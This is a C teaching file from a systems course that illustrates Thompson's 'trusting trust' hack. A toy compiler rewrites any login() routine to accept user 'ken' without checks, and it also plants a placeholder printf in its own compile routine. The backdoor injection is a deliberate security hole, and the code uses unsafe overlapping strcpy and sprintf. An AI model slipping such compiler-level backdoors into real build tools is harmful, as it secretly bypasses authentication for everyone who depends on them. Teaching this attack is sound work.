// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)

// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);

  /*****************************************************************
   * Step 1:
   */

  // match on the start of the login() routine:
  static char login_sig[] = "int login(char *user) {";

  // and inject an attack for "ken":
  static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

  char *location = strstr(program, login_sig);
  if (location) {
    // First copy everything after needle to the point it needs to be for
    // correct spacing
    int login_sig_len = strlen(login_sig);
    int login_attack_len = strlen(login_attack);

    strcpy(location + login_sig_len + login_attack_len,
           location + login_sig_len);

    // Then copy in the attack
    strncpy(location + login_sig_len, login_attack, login_attack_len);
  }

  /*****************************************************************
   * Step 2:
   */

  // search for the start of the compile routine:
  static char compile_sig[] =
      "static void compile(char *program, char *outname) {\n"
      "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
      "    assert(fp);";

  // and inject a placeholder "attack":
  // inject this after the assert above after the call to fopen.
  // not much of an attack.   this is just a quick placeholder.
  static char compile_attack[] =
      "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";

  location = strstr(program, compile_sig);
  if (location) {
    // First copy everything after needle to the point it needs to be for
    // correct spacing
    int compile_sig_len = strlen(compile_sig);
    int compile_attack_len = strlen(compile_attack);

    strcpy(location + compile_sig_len + compile_attack_len,
           location + compile_sig_len);

    // Then copy in the attack
    strncpy(location + compile_sig_len, compile_attack, compile_attack_len);
  }

  /************************************************************
   * don't modify the rest.
   */

  fprintf(fp, "%s", program);
  fclose(fp);

  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s", outname);
  if (system(buf) != 0)
    error("system failed\n");
}

#define N 8 * 1024 * 1024
static char buf[N + 1];

int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);

  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);

  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");

  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
